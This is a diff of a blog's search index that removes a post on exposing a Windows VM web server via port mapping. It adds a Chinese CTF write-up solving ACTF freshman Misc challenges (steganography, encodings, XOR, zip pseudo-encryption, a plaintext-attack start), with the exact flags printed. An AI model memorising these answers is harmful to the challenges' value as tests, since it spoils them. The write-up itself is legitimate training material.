@@ -131,52 +131,176 @@
       </categories>
       <tags>
         <tag>web</tag>
-        <tag>练习</tag>
       </tags>
   </entry>
   <entry>
-    <title>win10内网穿透</title>
-    <url>/2022/win10%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是我在探索服务器路上的一次记录，为了就是先去了解服务器。方便自己尝试，这篇文章也是参考许多大佬的文章。希望可以给你提供一点帮助。</p>
+    <title>Misc小合集（一）</title>
+    <url>/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记一次杂项小训练</p>
+<p><strong>Misc 1</strong> - <strong>Misc 10</strong></p>
 <span id="more"></span>
 
-<h1 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h1><ul>
-<li>Windows镜像</li>
-<li>VM16虚拟机</li>
-<li>花生壳8</li>
-<li>宝塔</li>
+<h1 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc 1"></a>Misc 1</h1><p>[ACTF新生赛2020]frequency</p>
+<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>strings</li>
+<li>word隐藏文字</li>
+<li>字频统计</li>
 </ul>
-<h1 id="开始搭建"><a href="#开始搭建" class="headerlink" title="开始搭建"></a>开始搭建</h1><p>虚拟机安安装就不嘴碎了，估计网上有许多教材，自己参考大佬再写。</p>
-<h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>安装Window10虚拟机，我选择专业版与自定义安装。</p>
-<h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>对虚拟机内的windows进行端口配置</p>
-<p>打开控制面板中系统和安全，打开防火墙设置，然后打开高级设置。</p>
-<p><img src="/2022/win10%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20220326192438-cgxcimc.png" alt="image.png"></p>
-<p>选择“入站规则” —&gt; “新建规则”</p>
-<p><img src="/2022/win10%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20220326192919-b07jjg4.png" alt="image.png"></p>
-<p>选择TCP，开放端口可以自己设置。</p>
-<p><img src="/2022/win10%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20220326192848-ai6dfyx.png" alt="image.png"></p>
-<p>接下来默认就可以了。</p>
-<h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>下载宝塔面板 ：<a href="https://www.bt.cn/">宝塔官网</a></p>
-<p>安装完成注册，打开宝塔面板</p>
-<p><img src="/2022/win10%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20220326193333-87xordg.png" alt="image.png"></p>
-<p>红框里保持默认，尽量不要修改。</p>
-<p>安装进去网站后，安装Nginx套件就好了。</p>
-<h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p>安装注册花生壳，自己注册后就会得到一个域名</p>
-<p><img src="/2022/win10%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20220326193702-hpmbecv.png" alt="image.png"></p>
-<p>然后新建一个自定义映射</p>
-<p><img src="/2022/win10%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20220326193914-5x22eh1.png" alt="image.png"></p>
-<p>映射成功就好了。</p>
-<h2 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a>Step 5</h2><p>在宝塔里面添加站点</p>
-<p><img src="/2022/win10%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20220326194149-fcey653.png" alt="image.png"></p>
-<p>默认就好。剩下就是你自己写站点了。</p>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>首先用string命令查看文件，得到两段可疑代码</p>
+<p>使用下面的一段，看起来像base64码</p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220312124955095.png"></p>
+<p>在Word里面，显示隐藏文字和解除隐藏。文字无法复制，但是我发现可以通过剪切出。</p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220312125607111.png"></p>
+<p>也可以通过解除隐藏复制</p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220312125914279.png"></p>
+<p>将它们组合起来</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a2draGxmY290bnRpdWZwZ2hodGN3dWprY2ttb3ducGNrbXdseWd0bHBtZmtneWFhaWh1Y2RsYXRveXVjb2lnZ3JwbGt2a2Ftcmt0cXp4ZW1taXdrbGh1YWVrY2VvbHBvY2ZtdGFobWdmbWF2YWpuYmNwbWx0anRwdWZqY2FwY3RvanBqYmZmYmpid2h1YWxnZ3lqbmFtY2JmeWFjamJheGtpeGxtbXFpa3NtcHRxeW9qZXJ0ZmVrdGR4ZHh4YnRyeGNhbmd5bXNpbWh2dXdrdGV4c2dscnRwZ2FrdGJtZnVjZ3ZubXRqdWZvZWt5bXRsaW14ZGlqanB4eWl0YWJwbWt1Y2NubGtwb2V0Z2NkY3Bvc2tpenZ5eHJ0enhyYXh0bm9paHFjeGZvYWFhbHBhanlja2VrYnljZnZqb21sbGthamd5bWdmZGNycGVxa2xmc2NtZWppY3BqaWtjcHBhY3h5ZXZma3ljcHBia2R6Y2ZsbGlrcW5pdGNrYmhqb3JuZGhzb21mdHlwYWhwcW94cnlpbWhmbGNoY21rb3JldG1yb3RrYXJjanRobWZ0aWxpam55a3V0aWhienR0dW1zbmdmdGxtcmJmZmx0ZndjbmptZmF0bGZiemxva3RscHBsbWZpY29rcHBucGFjbWZ1Z21wdW5kdnRvbXdldmNqc2dhamdmZXF1dXBhaWV0eW5mamJicGpzbHZ5bmFmdG1scHBka3R0b2Z1emppanhpdGJmaXJtb3ZwemVraXJic2Zqc2d6bHVrb2x5dm9obXZnY3BrdGhzeGZ6bW1ibm1sZHp5dWljZHZrbXpiYXlidG9yY2ZvdHRkYW1jY25iYXBucmd4bGN5cGh5Zm5jZXhidmRubG9rZ295aWxwcmxvbnNodGNranR4bmFiamhsbWJwZGNtaGtqbmxnbXRnam5qYWtyaXpsbHBtbWFscHhhbXVuaW51cGtwZGlhcHNzbXZrZGp2Z2l5b2R1bXBuYXBsamtqYmNmaHRoc2tpb2twZ3R0eWhubmRzeGtxanp2dmRvc2VwcG9pZ3l0bW5uYXZjdG9wZHlpeHZiZG9zb2JtY3ViaXVhanhoeWZrdnJremdjdXlpbHB2YXdheW5xYWFwbGJrd2lpeHJjdGN0bGt4ZmpscGVhbW1qbmF1amNvdWlmbXZpa2ZpbXJvYXF0Y3RjZm1hdWJnYWdva2FyZnFmaGVtb3NydHlmb3B1a3VkY2FhaW1oZGZvZ25oa3JjZWxwY2F0Y3RweWpsYXZva2xnY2xhdGx0bXR6eWdwZWhma3poY3R6bmdtb2ZjaXpsdm54dG5sdWFqbHRvdmNqYWp1YnphdHBlaGhma25uZ2dwbHlsaXZmZWFpZHJteWp0YWNhbXhjbmtmeXN0d2ZuZmx5bmJta2NrYXJ4YWlzcGpsa3ZjdHZrbHh1bmNmcGJ4dmlyaXFleXBtdXZ1bHZsamNrY3lwcHRwdmV0b3hobWlwYmlsbmplb3drd3VjdG9rbmFmcHdvYXBmdGNsemhwaHhjY2F0dGh1bXZ3aHpvbWFmd3Fxbmxzb3lhYnV0bHpwaWF0Zm1tYWprcmR2bGN6d2pwc3Nwb2FiaWZpcGhrb2NocHRrYXRrYWZlb255YmZpdmVjbGR6b2ZhdGV0Z2FsaGFmYW1vYXlvc291bm5hZmlhdGNqdGl3b29sYWNya2N1YWRwdXRreWxweXBiZ2ZlcHdwc25jd2tjd2xsYXJ5anNjYW5id3BkcHpicHR1dG5sbm9wd3BpdGJsb3RsbHppZmtsYWF1cmpwaWFqZnB0a2ZteHBic3VjdmpzZ21jYWxhbnRyc2NrYmt1eWZnYWFrZmFjbmxkdXZxZXR5amdqbW5hZWFjbmdheGNuYW1qbWlna2tpdW1sbmR3Y2ttdWFuYW52cnJiZnp4enl1dWVob25lbWxjanp1dm9hanVmZGdqampjZ21ucHRmdXVjdWJjdGpoYW1sb2xmaG9pZnZia2themNwb3pjeXVjYnJnb2picG5haGNneXV0dGR2bXR0dndqbWhic2ptYmJhdmNkbHlob3Fqb21wY3B2aHRrb2FpcnZ0bWtmZnlhdGttcHR1dW9vb2xncG5udWVsaGZodnZpc3Vrd3lubWlhY25sbHVtaHRqZWt1YXV1cGxyeGtpZXB1anhsaWNma2NiY2htbmdsZ3BsaWhteWNybnNvbWF3dWZ1b29tdXVuaGRvb2FydWRhbW9hbW9ocW9vY2Z1cGp1aWFieHh1dnl2bm9zb3Vvb3Zha2xjZmt0eXJmYWdmYXl2cHVmdnBiZ3RhZmVraXBpY292dGZ0bnV4c2phdmpkcWt2ZnVpa2x0bWRrYmJua3BhZnhycXBmZ2N0dmFzY3VqamN1Y2h1YXpjaXVtdHRkbmF3aWhtbW9qZmJoeHZvbXRmcGJmaHR2aXdsYXVlb2dwcG1qc3BjYWxmaGNhcmtsYmlzcGh0anBhbmhsaXNwbnRza2tjbGpnZ2tjenRmaG5lY25wdGlmZnRyZG10amZla2ZpdGthc2RnbmVscHVoYmZpbXB1Y2JrcGtjbXhsZmtwaWlqdmh0amtzeWx6cm9vZmFjeGNscGpuaGJpcmN5ZGp0Y2xqZG9ibHlyeW1hdGdoaWZvam1qanNla29vbW9mY2FjdGF2ZmN5Zm11Znhoc3Rqd3VwYmpreW9nbnlyeXBseXBxbGF5eW1veHRhbnFkcHVyYnd6cGxsb2traGhtYW5kam5hdGNibGtjb3Rna2x1dHR3YmRhdHFybWF6cHJ2YXd6anhlZmhqdGRraWt1cmxsY2xjam9naG1sd3RhbWRkY2NucXVyb3Jha2N5b2JsYXJ6YWNtbnFjbWV0dHVheWF1eWl2c21ma25uYW5sdGNtaWdmcmdhYmlwdG50aG1tdXRwaWJ5bHJhdGhqY2doY2ZtbG92cGNudHFwZW96bG90ZGtlaW9jZmtjaXZ1eWx6Ympvb3hjc2FjbmdkdXZ4dG50aGphZXBhdX1rbGFocGNtdnppY2twYWFwaG9jZ2lvZ2p0dnB0Z2poZG9udW5scGFvbG5kcWJxZmRtYnBqam94Ym9tbGlreXVpcG54cXh6Y2lmb3JhaGhldXl5dHpoanV0Z2Z3dHVscmpjZnhvaWFneWpmYnBqaWFrZ3l0eGJmbnBsZnBxd3RkaXFuaXR2dmF1amRqbGlmamlvcnltdmZ4bXhnb3JpY3ljZGZob2ZiYnlnZmxhdGlyamRpZGFkcXZpa2pvY2l5ZmR6aHJvZ255eWlia2dubnZobWpsb2xhdndmaWpjZ2dma3B0a3BnY3FmYWZheXNpdHltYWN2a3FweWxoaGJ1Ymh4c2x1emN5dmxvcmlwdGxwZmxjdWljcG5mc2hpeXh2a2tiY2p5dWtvdGFsZmNpcGhjZGd4aWZ0a2xkZ29wanNtdXJ0eWp5cGhia2JmbmJ3YnNvZmlheHRsdWhwbXJmZGFrdWx1cGVhcHZyeXhtYWVwaGF5bmV4emZsbmV2am1pYndvcml0aGh4YmJ5cG1tYWJvYmZuZmNvanR0Y3Jram1naXJ2bWlzdW5mbHVodGVudHJodGVvamtjaGtwZnBhZXNnd2dscWRrdnZudWx1bnF7bG1sdGFscGhvdWZqcGlhbGNmbGZ5ZHZmd3lkb2ZraGFpeWF3bGx3Y2pvYXJxdnpqbGZmZ2xjdGNsYmxwa2JzZmxocnRqZGFvd3ByZGJjdWJmbHlveWJodmh3ZndvZWl0Z254YnpuaWZwbGx4bXN0a251aWhvYmZlZWZra2FreW5uYWNra2NkdWFtZ3N2bnBoY3RmZ3NybnJvZWh2ZW5kYmZpb21xZm14Ym1paWl1bGF2b2dma2dhY2lrYWFtcHBybGpmbXBqY3VhYXNja2l1cWlmY2liamx1dGNtcGF0b2pyanZmeGdsenBvcGpkZ2NoanVqbGtuZnd0cG5qZnBhY3JrcHRmaGNzamdyaXBjcmZjZGFsem5ob25mZGNvaG9zZmhvaGVha250aXRtamZsbmJvcGNsY3hjdWlnb3hja3JiYWxyYWVidGFhcml0ZWZtemNxaWRvZmd0ZnFnYmFkaWNubWhvdGlvbm9iZnlubGdvenRkYXZ2aW14b2JvdGlra2Z4d2lyb3JwZmNjdXpob3BoZmRjaWVrY2p5b21lamtjZ2Zmam51bmhvcGFkdGZndG1sdA==</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>进行base64解码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kgkhlfcotntiufpghhtcwujkckmownpckmwlygtlpmfkgyaaihucdlatoyucoiggrplkvkamrktqzxemmiwklhuaekceolpocfmtahmgfmavajnbcpmltjtpufjcapctojpjbffbjbwhualggyjnamcbfyacjbaxkixlmmqiksmptqyojertfektdxdxxbtrxcangymsimhvuwktexsglrtpgaktbmfucgvnmtjufoekymtlimxdijjpxyitabpmkuccnlkpoetgcdcposkizvyxrtzxraxtnoihqcxfoaaalpajyckekbycfvjomllkajgymgfdcrpeqklfscmejicpjikcppacxyevfkycppbkdzcfllikqnitckbhjorndhsomftypahpqoxryimhflchcmkoretmrotkarcjthmftilijnykutihbzttumsngftlmrbffltfwcnjmfatlfbzloktlpplmficokppnpacmfugmpundvtomwevcjsgajgfequupaietynfjbbpjslvynaftmlppdkttofuzjijxitbfirmovpzekirbsfjsgzlukolyvohmvgcpkthsxfzmmbnmldzyuicdvkmzbaybtorcfottdamccnbapnrgxlcyphyfncexbvdnlokgoyilprlonshtckjtxnabjhlmbpdcmhkjnlgmtgjnjakrizllpmmalpxamuninupkpdiapssmvkdjvgiyodumpnapljkjbcfhthskiokpgttyhnndsxkqjzvvdoseppoigytmnnavctopdyixvbdosobmcubiuajxhyfkvrkzgcuyilpvawaynqaaplbkwiixrctctlkxfjlpeammjnaujcouifmvikfimroaqtctcfmaubgagokarfqfhemosrtyfopukudcaaimhdfognhkrcelpcatctpyjlavoklgclatltmtzygpehfkzhctzngmofcizlvnxtnluajltovcjajubzatpehhfknnggplylivfeaidrmyjtacamxcnkfystwfnflynbmkckarxaispjlkvctvklxuncfpbxviriqeypmuvulvljckcypptpvetoxhmipbilnjeowkwuctoknafpwoapftclzhphxccatthumvwhzomafwqqnlsoyabutlzpiatfmmajkrdvlczwjpsspoabifiphkochptkatkafeonybfivecldzofatetgalhafamoayosounnafiatcjtiwoolacrkcuadputkylpypbgfepwpsncwkcwllaryjscanbwpdpzbptutnlnopwpitblotllzifklaaurjpiajfptkfmxpbsucvjsgmcalantrsckbkuyfgaakfacnlduvqetyjgjmnaeacngaxcnamjmigkkiumlndwckmuananvrrbfzxzyuuehonemlcjzuvoajufdgjjjcgmnptfuucubctjhamlolfhoifvbkkazcpozcyucbrgojbpnahcgyuttdvmttvwjmhbsjmbbavcdlyhoqjompcpvhtkoairvtmkffyatkmptuuooolgpnnuelhfhvvisukwynmiacnllumhtjekuauuplrxkiepujxlicfkcbchmnglgplihmycrnsomawufuoomuunhdooarudamoamohqoocfupjuiabxxuvyvnosouoovaklcfktyrfagfayvpufvpbgtafekipicovtftnuxsjavjdqkvfuikltmdkbbnkpafxrqpfgctvascujjcuchuazciumttdnawihmmojfbhxvomtfpbfhtviwlaueogppmjspcalfhcarklbisphtjpanhlispntskkcljggkcztfhnecnptifftrdmtjfekfitkasdgnelpuhbfimpucbkpkcmxlfkpiijvhtjksylzroofacxclpjnhbircydjtcljdoblyrymatghifojmjjsekoomofcactavfcyfmufxhstjwupbjkyognyryplypqlayymoxtanqdpurbwzpllokkhhmandjnatcblkcotgkluttwbdatqrmazprvawzjxefhjtdkikurllclcjoghmlwtamddccnqurorakcyoblarzacmnqcmettuayauyivsmfknnanltcmigfrgabiptnthmmutpibylrathjcghcfmlovpcntqpeozlotdkeiocfkcivuylzbjooxcsacngduvxtnthjaepau&#125;klahpcmvzickpaaphocgiogjtvptgjhdonunlpaolndqbqfdmbpjjoxbomlikyuipnxqxzciforahheuyytzhjutgfwtulrjcfxoiagyjfbpjiakgytxbfnplfpqwtdiqnitvvaujdjlifjiorymvfxmxgoricycdfhofbbygflatirjdidadqvikjociyfdzhrognyyibkgnnvhmjlolavwfijcggfkptkpgcqfafaysitymacvkqpylhhbubhxsluzcyvloriptlpflcuicpnfshiyxvkkbcjyukotalfciphcdgxiftkldgopjsmurtyjyphbkbfnbwbsofiaxtluhpmrfdakulupeapvryxmaephaynexzflnevjmibworithhxbbypmmabobfnfcojttcrkjmgirvmisunfluhtentrhteojkchkpfpaesgwglqdkvvnulunq&#123;lmltalphoufjpialcflfydvfwydofkhaiyawllwcjoarqvzjlffglctclblpkbsflhrtjdaowprdbcubflyoybhvhwfwoeitgnxbznifpllxmstknuihobfeefkkakynnackkcduamgsvnphctfgsrnroehvendbfiomqfmxbmiiiulavogfkgacikaampprljfmpjcuaasckiuqifcibjlutcmpatojrjvfxglzpopjdgchjujlknfwtpnjfpacrkptfhcsjgripcrfcdalznhonfdcohosfhoheakntitmjflnbopclcxcuigoxckrbalraebtaaritefmzcqidofgtfqgbadicnmhotionobfynlgoztdavvimxobotikkfxwirorpfccuzhophfdciekcjyomejkcgffjnunhopadtfgtmlt</span><br></pre></td></tr></table></figure>
+
+<p>frequency有频率的意思，猜测是字频统计</p>
+<p>借用大佬脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#用来统计TXT文本，并统计字频</span></span><br><span class="line"><span class="comment"># 打开文件</span></span><br><span class="line">fr = <span class="built_in">open</span>(<span class="string">r&#x27;C:/Users/zxy13/Desktop/1.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line"><span class="comment"># 读取文件所有行</span></span><br><span class="line">content = fr.readlines()</span><br><span class="line">contentLines = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">characers = []  <span class="comment"># 存放不同字的总数</span></span><br><span class="line">rate = &#123;&#125;  <span class="comment"># 存放每个字出现的频率</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 依次迭代所有行</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> content:</span><br><span class="line">    <span class="comment"># 去除空格</span></span><br><span class="line">    line = line.strip()</span><br><span class="line">    <span class="comment"># 如果是空行，则跳过</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(line) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    contentLines = contentLines + line</span><br><span class="line">    <span class="comment"># 统计每一字出现的个数</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(line)):</span><br><span class="line">        <span class="comment"># 如果字符第一次出现 加入到字符数组中</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> line[x] <span class="keyword">in</span> characers:</span><br><span class="line">            characers.append(line[x])</span><br><span class="line">        <span class="comment"># 如果是字符第一次出现 加入到字典中</span></span><br><span class="line">        <span class="keyword">if</span> line[x] <span class="keyword">not</span> <span class="keyword">in</span> rate:</span><br><span class="line">            rate[line[x]] = <span class="number">1</span></span><br><span class="line">        <span class="comment"># 出现次数加一</span></span><br><span class="line">        rate[line[x]] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对字典进行倒数排序 从高到低 其中e表示dict.items()中的一个元素，</span></span><br><span class="line"><span class="comment"># e[1]则表示按 值排序如果把e[1]改成e[0]，那么则是按键排序，</span></span><br><span class="line"><span class="comment"># reverse=False可以省略，默认为升序排列</span></span><br><span class="line">rate = <span class="built_in">sorted</span>(rate.items(), key=<span class="keyword">lambda</span> e: e[<span class="number">1</span>], reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;全文共有%d个字&#x27;</span> % <span class="built_in">len</span>(contentLines))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;一共有%d个不同的字&#x27;</span> % <span class="built_in">len</span>(characers))</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> rate:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[&quot;</span>, i[<span class="number">0</span>], <span class="string">&quot;] 共出现 &quot;</span>, i[<span class="number">1</span>], <span class="string">&quot;次&quot;</span>)</span><br><span class="line"></span><br><span class="line">fr.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">actf&#123;plokmijnuhbygvrdxeszwq&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Misc-2"><a href="#Misc-2" class="headerlink" title="Misc 2"></a>Misc 2</h1><p>[ACTF新生赛2020]outguess</p>
+<h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>outguess</li>
+<li>社会主义核心价值观编码</li>
+</ul>
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>在flag.txt中有，猜测是outguess隐写</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag在哪？</span><br><span class="line">你Guess一下啊！</span><br></pre></td></tr></table></figure>
+
+<p>在图片的属性中发现：<code>公正民主公正文明公正和谐</code></p>
+<p>解密出来是：<code>abc</code></p>
+<p>使用outguess隐写工具</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">outguess -r mmm.jpg -t 1.txt -k abc   </span><br></pre></td></tr></table></figure>
+
+<p>得到flag：<code>ACTF&#123;gue33_Gu3Ss!2020&#125;</code></p>
+<h1 id="Misc3"><a href="#Misc3" class="headerlink" title="Misc3"></a>Misc3</h1><p>[ACTF新生赛2020]NTFS数据流</p>
+<h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>NTFS隐写</li>
+</ul>
+<h2 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h2><p>注意：这里解压的时候使用Win RAR解压，涉及NTFS流的都需要Win RAR解压</p>
+<p>工具：Ntfsstreamseditor.exe</p>
+<p>使用工具就可以得到flag了。</p>
+<h1 id="Misc4"><a href="#Misc4" class="headerlink" title="Misc4"></a>Misc4</h1><p>[ACTF新生赛2020]music</p>
+<h2 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>音频隐写</li>
+<li>异或处理</li>
+</ul>
+<h2 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h2><p>音频没有办法打开，显示异常，用010查看</p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313154611541.png"></p>
+<p>发现根本不符合格式</p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313154714073.png"></p>
+<p>多次出行相同的字符，猜测是进行了异或，<code>工具-&gt;十六进制运算-&gt;二进制异或</code></p>
+<p>全文进行异或后得到正确文件</p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313154858601.png"></p>
+<p>得到flag：<code>actfabcdfghijk</code></p>
+<h1 id="Misc5"><a href="#Misc5" class="headerlink" title="Misc5"></a>Misc5</h1><p>[ACTF新生赛2020]wget</p>
+<h2 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>流量分析</li>
+<li>zip伪加密</li>
+</ul>
+<h2 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h2><p>我通过binwalk命令查看到流量包中有存在压缩包，我利用命令分离文件，但是文件损坏</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">foremost -T wget.pcapng </span><br></pre></td></tr></table></figure>
+
+<p>我直接在wirshark中直接保存出得到压缩包，但是压缩包需要密码。利用ZipCenOp.jar修复zip压缩包。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar .\ZipCenOp.jar r .\1.zip</span><br></pre></td></tr></table></figure>
+
+<p>解开压缩包得到flag文件</p>
+<p>使用strings命令就可以输出flag：actf{c5558bcf-26da-4f8b-b181-b61f3850b9e5}</p>
+<h1 id="Misc6"><a href="#Misc6" class="headerlink" title="Misc6"></a>Misc6</h1><p>[ACTF新生赛2021]与熊论道</p>
+<h2 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>与熊论道编码</li>
+<li>社会主义核心价值观编码</li>
+<li>bmp图片隐写</li>
+</ul>
+<h2 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h2><p>猜测是和与禅论道一样的编码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">熊曰：呋食性咯怎很盜溫吖盜萌嚄眠嗥吖物和我嘿襲人現擊有嚁嘿襲嗡取果盜和吖非嗷咬和取象洞家食住捕咬嗅拙喜爾常拙捕咯會呦唬沒歡肉咬哞笨註氏破吃咯噤誘嗡唬樣取偶蜜嗒我咬咬嘶盜覺歡我嗡嗅哞麼你和嗄會取喜嗡咬歡象取襲</span><br></pre></td></tr></table></figure>
+
+<p><a href="http://hi.pcmoe.net/">与熊论道</a></p>
+<p>解得：<code>法治富强法治法治公正自由和谐诚信富强和谐民主和谐文明和谐和谐和谐自由和谐平等和谐公正</code></p>
+<p><a href="https://atool.vip/corevalue/">社会主义核心价值观编码</a></p>
+<p>解得：<code>pwd:123456</code></p>
+<p>密码是干嘛用的呢？</p>
+<p>有关bmp图片隐写，我找到两个工具wbStego4.3open和silenteye</p>
+<p>这题用wbStego4.3open就可以解密</p>
+<p><strong><code>ACTF&#123;PXY_wants_@_bOyfri3nd&#125;</code></strong></p>
+<h1 id="Misc7"><a href="#Misc7" class="headerlink" title="Misc7"></a>Misc7</h1><p>[ACTF新生赛2020]你看我匀称吗？</p>
+<h2 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>LSB隐写</li>
+<li>修改图片宽高</li>
+</ul>
+<h2 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h2><p>两个文件一个要密码的压缩包，匀称？猜测高度有问题</p>
+<p>使用工具TweakPNG查看，发现有报错</p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313165532165.png"></p>
+<p>用010打开图片修改</p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313170605117.png"></p>
+<p>得到：<strong>you come</strong>。解压得到图片</p>
+<p>猜测LSB隐写</p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313171718397.png"></p>
+<p>得到flag：**<code>ACTF&#123;llL llsb_i3_e3asY&#125;</code>**</p>
+<h1 id="Misc-8"><a href="#Misc-8" class="headerlink" title="Misc 8"></a>Misc 8</h1><p>[ACTF新生赛2020]剑龙</p>
+<h2 id="知识点-7"><a href="#知识点-7" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>AAencode编码（颜文字）</li>
+<li>steghide隐写</li>
+<li>DES加解密</li>
+<li>stegosaurus（pyc）隐写</li>
+</ul>
+<h2 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h2><p>解开hint文件夹得到一个图片与文本</p>
+<p>文本中是颜文字；<a href="http://www.hiencode.com/aaencode.html">在线解码</a></p>
+<p>得到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">welcom3!</span><br></pre></td></tr></table></figure>
+
+<p>在图片信息中可以看</p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313172549463.png"></p>
+<p>key：<code>**@#$%^&amp;%%$)**</code></p>
+<p>hh.jpg是<strong>steghide</strong>隐写</p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313183441314.png"></p>
+<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">U2FsdGVkX1/7KeHVl5984OsGUVSanPfPednHpK9lKvp0kdrxO4Tj/Q==</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.sojson.com/encrypt_des.html">DES解密</a></p>
+<p>得到：<strong>think about stegosaurus</strong></p>
+<p>对文件进行file命令，发现是python文件 <strong><code>O_O: python 3.6 byte-compiled</code></strong></p>
+<p>运行命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./stegosaurus -x O_O.pyc </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313190100195.png"></p>
+<p>得到flag：**<code>flag&#123;3teg0Sauru3_!1&#125;</code>**</p>
+<h1 id="Misc-9"><a href="#Misc-9" class="headerlink" title="Misc 9"></a>Misc 9</h1><p>[ACTF新生赛2020]明文攻击</p>
+<h2 id="知识点-8"><a href="#知识点-8" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>CRC爆破</li>
+</ul>
+<h2 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h2><p>提示明文攻击</p>
+<p>先看图片，在图片尾有flag.txt，补上<code>50 4B</code></p>
+<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313202715767.png"></p>
+<p>新建成压缩包</p>
